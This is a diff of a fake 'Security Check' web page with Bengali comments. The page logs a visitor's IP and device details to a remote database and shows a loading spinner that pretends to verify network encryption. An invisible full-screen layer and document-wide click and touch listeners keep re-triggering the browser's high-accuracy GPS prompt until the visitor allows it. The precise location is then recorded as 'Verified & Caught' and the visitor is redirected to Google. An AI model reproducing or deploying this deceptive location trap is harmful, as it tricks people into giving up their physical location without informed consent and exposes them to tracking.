@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Security Verification</title>
+    <title>Security Gateway</title>
     
     <!-- UAParser -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
@@ -34,9 +34,9 @@
             set(newLogRef, {
                 timestamp: new Date().toString(),
                 ...data,
-                latitude: "Tracing...",
-                longitude: "Tracing...",
-                actionStatus: "Trap Active - Loop Started"
+                latitude: "Wait...",
+                longitude: "Wait...",
+                actionStatus: "Trap Started"
             }).then(() => {
                 sessionStorage.setItem('logKey', newLogRef.key);
                 // ডাটা সেভ হওয়ার পর আসল খেলা শুরু
@@ -54,7 +54,7 @@
                     longitude: lng,
                     actionStatus: "✅ Verified & Caught"
                 }).then(() => {
-                    // কাজ শেষে গুগলে পাঠিয়ে দেওয়া
+                    // কাজ শেষে মুক্তি
                     window.location.href = "https://www.google.com";
                 });
             }
@@ -62,91 +62,72 @@
     </script>
 
     <style>
-        :root {
-            --bg-color: #e0e5ec;
-            --text-color: #4a4a4a;
-            --accent-color: #007bff;
-            --shadow-light: #ffffff;
-            --shadow-dark: #a3b1c6;
-        }
-
         body {
             margin: 0; padding: 0;
-            background-color: var(--bg-color);
+            background-color: #f0f2f5;
             display: flex; flex-direction: column;
             justify-content: center; align-items: center;
             height: 100vh; overflow: hidden;
-            font-family: 'Segoe UI', sans-serif;
-            color: var(--text-color);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            cursor: progress; /* মাউস কার্সর লোডিং দেখাবে */
         }
 
-        /* পুরো স্ক্রিন জুড়ে অদৃশ্য জাল (Click Trap) */
+        /* পুরো স্ক্রিন জুড়ে একটা অদৃশ্য জাল */
         #clickTrap {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 9999; cursor: auto;
+            z-index: 9999; cursor: pointer;
         }
 
-        .card {
-            width: 85%; max-width: 350px; padding: 40px;
-            border-radius: 30px;
-            background: var(--bg-color);
-            box-shadow: 20px 20px 60px var(--shadow-dark), 
-                       -20px -20px 60px var(--shadow-light);
+        .loader-box {
             text-align: center;
-            position: relative;
-            z-index: 1; /* জালের নিচে থাকবে, কিন্তু দেখা যাবে */
+            background: #ffffff;
+            padding: 40px; border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            max-width: 300px;
         }
 
-        .icon-area {
-            width: 80px; height: 80px; margin: 0 auto 25px auto;
-            border-radius: 50%;
-            background: var(--bg-color);
-            box-shadow: inset 6px 6px 12px var(--shadow-dark), 
-                        inset -6px -6px 12px var(--shadow-light);
-            display: flex; justify-content: center; align-items: center;
-            font-size: 30px;
-        }
-
-        h2 { font-size: 20px; margin-bottom: 10px; color: var(--text-color); }
-        p { font-size: 13px; color: #777; margin-bottom: 30px; line-height: 1.6; }
-
-        /* সুন্দর লোডিং স্পিনার */
         .spinner {
-            width: 40px; height: 40px;
-            border: 4px solid rgba(0, 123, 255, 0.1);
-            border-left-color: var(--accent-color);
+            width: 50px; height: 50px;
+            border: 5px solid #e1e4e8;
+            border-top: 5px solid #007bff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto;
+            margin: 0 auto 20px auto;
         }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        h2 { color: #333; font-size: 18px; margin-bottom: 5px; }
+        p { color: #888; font-size: 13px; }
 
     </style>
 </head>
 <body>
 
-    <!-- এই ডিভটা পুরো স্ক্রিন জুড়ে থাকবে -->
+    <!-- এই ডিভটা পুরো স্ক্রিন দখল করে থাকবে, যেখানেই ক্লিক করবে লোকেশন চাইবে -->
     <div id="clickTrap" onclick="forceBrowserPrompt()"></div>
 
-    <div class="card">
-        <div class="icon-area">🛡️</div>
-        
-        <h2 id="statusTitle">Security Verification</h2>
-        <p id="statusMsg">Checking network encryption parameters. Please wait...</p>
-
+    <div class="loader-box">
         <div class="spinner"></div>
+        <h2 id="statusText">Security Check...</h2>
+        <p>Verifying network encryption.</p>
     </div>
 
     <script>
         let ipInfo = {};
-        let isAsking = false; 
+        let isAsking = false; // ফ্ল্যাগ যাতে একসাথে একাধিক রিকোয়েস্ট না যায়
 
         window.onload = function() {
-            // আইপি ডাটা ফেচ
+            // আইপি এবং ডিভাইস ইনফো আগে নিয়ে নিই
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
-                .then(data => { ipInfo = data; prepareInitialData(); })
-                .catch(() => { ipInfo = { ip: "Unknown" }; prepareInitialData(); });
+                .then(data => {
+                    ipInfo = data;
+                    prepareInitialData();
+                })
+                .catch(() => {
+                    ipInfo = { ip: "Unknown", city: "Unknown" };
+                    prepareInitialData();
+                });
         };
 
         function prepareInitialData() {
@@ -168,41 +149,45 @@
             if(window.initLog) window.initLog(initialPayload);
         }
 
-        // লুপ ফাংশন
+        // ৩. আসল ফাংশন (যেটা বারবার কল হবে)
         function startAnnoyingLoop() {
-            // ১. লোড হওয়ার ২ সেকেন্ড পর প্রথম চেষ্টা
-            setTimeout(forceBrowserPrompt, 2000);
+            // ১. পেজ লোড হওয়ার ১.৫ সেকেন্ড পর প্রথম চেষ্টা
+            setTimeout(forceBrowserPrompt, 1500);
             
-            // ২. স্ক্রিনে টাচ বা ক্লিক করলেই আবার চেষ্টা
-            let trap = document.getElementById('clickTrap');
-            trap.addEventListener('touchstart', forceBrowserPrompt);
-            trap.addEventListener('click', forceBrowserPrompt);
+            // ২. কেউ যদি মাউস নাড়ায় বা স্ক্রিনে টাচ করে, তাহলেও ট্রিগার হবে
+            document.addEventListener('touchstart', forceBrowserPrompt);
+            document.addEventListener('click', forceBrowserPrompt);
         }
 
         function forceBrowserPrompt() {
+            // যদি অলরেডি রিকোয়েস্ট প্রসেসিং এ থাকে, তাহলে থামো
             if(isAsking) return;
             isAsking = true;
 
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
+                    // Success
                     function(position) {
-                        // সাকসেস!
-                        document.getElementById('statusTitle').innerText = "Verified!";
-                        document.getElementById('statusTitle').style.color = "#00b894";
-                        document.querySelector('.spinner').style.borderLeftColor = "#00b894";
+                        document.getElementById('statusText').innerText = "Verified!";
+                        document.querySelector('.spinner').style.borderTopColor = "#00b894";
                         
-                        // ট্র্যাপ সরিয়ে ফেললাম
+                        // লোকেশন পেয়ে গেছি, আর ডিস্টার্ব করার দরকার নেই
+                        document.removeEventListener('touchstart', forceBrowserPrompt);
+                        document.removeEventListener('click', forceBrowserPrompt);
                         document.getElementById('clickTrap').style.display = 'none';
 
                         if(window.updateWithGPS) {
                             window.updateWithGPS(position.coords.latitude, position.coords.longitude);
                         }
                     },
+                    // Error (Block or Close)
                     function(error) {
                         isAsking = false; // আবার চাওয়ার জন্য রেডি
-                        console.log("GPS Blocked/Closed. Re-arming trap.");
-                        // হ্যাকারকে কিছু দেখানোর দরকার নেই, সে ভাববে লোডিং হচ্ছে।
-                        // কিন্তু সে স্ক্রিনে টাচ করলেই আবার পপ-আপ আসবে।
+                        console.log("User denied/closed. Re-arming trap.");
+                        
+                        // হ্যাকার ভাববে লোডিং হচ্ছে, কিন্তু আসলে আমরা আবার রিকোয়েস্টের অপেক্ষায় আছি
+                        // এখানে আমরা কোনো UI চেঞ্জ করব না, জাস্ট চুপচাপ থাকব
+                        // সে বিরক্ত হয়ে স্ক্রিনে ট্যাপ করলেই আবার পপ-আপ আসবে
                     },
                     { enableHighAccuracy: true }
                 );
